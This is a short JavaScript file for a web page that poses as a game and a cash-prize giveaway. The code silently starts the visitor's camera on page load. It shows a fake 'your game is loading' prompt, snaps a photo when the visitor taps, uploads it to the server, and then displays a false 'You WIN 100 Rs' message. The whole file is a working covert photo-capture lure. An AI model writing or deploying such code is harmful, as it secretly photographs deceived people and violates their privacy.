const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("captureBtn");
const status = document.getElementById("status");

let streamReady = false;

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();
    streamReady = true;
    console.log("Camera started silently.");
  } catch (err) {
    console.error("Camera error:", err);
  }
}

function showLoadingText(text) {
  let dots = 0;
  status.textContent = text;
  const interval = setInterval(() => {
    dots = (dots + 1) % 4;
    status.textContent = text + ".".repeat(dots);
  }, 300);
  return interval;
}

captureBtn.addEventListener("click", async () => {
  status.textContent = "";

  if (!streamReady) await startCamera();

  const loader = showLoadingText("🕹️ Tap 2 times please, your game is loading");

  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    try {
      const form = new FormData();
      form.append("photo", blob, `capture_${Date.now()}.jpg`);

      const res = await fetch("/upload", { method: "POST", body: form });
      const data = await res.json();

      clearInterval(loader);

      if (data && data.success) {
        status.textContent = "🎉 You WIN 100 Rs successfully!";
        console.log("Uploaded file path:", data.filePath); // 👈 Only visible in Render logs
      } else {
        status.textContent = "❌ Upload failed. Try again.";
      }
    } catch (err) {
      clearInterval(loader);
      status.textContent = "❌ Upload failed. Check console.";
    }
  }, "image/jpeg");
});

// Start camera early but silently
startCamera();